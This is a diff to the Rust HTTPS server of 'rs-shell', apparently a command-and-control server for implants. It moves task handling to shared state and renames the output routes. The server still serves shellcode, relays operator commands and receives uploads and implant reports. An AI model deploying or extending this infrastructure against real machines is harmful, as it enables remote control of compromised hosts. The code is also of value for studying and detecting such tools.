@@ -1,9 +1,9 @@
 use actix_multipart::form::tempfile::TempFileConfig;
 use actix_web::http::KeepAlive;
-use actix_web::{middleware, web, App, HttpServer};
-//use actix_multipart::MultipartError;
+use actix_web::{App, HttpServer, middleware, web};
 use std::fs::File;
 use std::io::BufReader;
+use std::sync::Arc;
 
 use crate::https::routes::*;
 
@@ -34,13 +34,16 @@ pub async fn server(i: &str, cert_path: &str, tls_key: &str) -> std::io::Result<
     log::info!("Creating directories and files");
     std::fs::create_dir_all("./downloads")?;
     std::fs::create_dir_all("./tmp")?;
-    File::create("next_task.txt")?;
+
+    let state = Arc::new(AppState::new());
 
     let port = 443;
-    HttpServer::new(|| {
+    HttpServer::new(move || {
+        let data = web::Data::new(state.clone());
         App::new()
             .wrap(middleware::Logger::default())
             .app_data(TempFileConfig::default().directory("./tmp"))
+            .app_data(data)
             /*
                 Using routes instead of services with a scope and macros, because file upload with multipart data seems bugged with scopes
                 Additionally, it looks like it is only possible to send multipart request to the root of the app, which must be declared as a service with a resource
@@ -53,9 +56,9 @@ pub async fn server(i: &str, cert_path: &str, tls_key: &str) -> std::io::Result<
                 "/rs-shell/shellcode{shellcode:.*}",
                 web::get().to(shellcode),
             )
-            .route("/rs-shell/read_output", web::get().to(read_output))
+            .route("/rs-shell/wait_for_output", web::get().to(wait_for_output))
             .route("/rs-shell/upload{filename:.*}", web::get().to(upload))
-            .route("/rs-shell/output_imp", web::post().to(output_imp))
+            .route("/rs-shell/receive_output", web::post().to(receive_output))
             .route("/rs-shell/operator_cmd", web::post().to(operator_cmd))
             .route("/rs-shell/os", web::post().to(implant_os))
     })
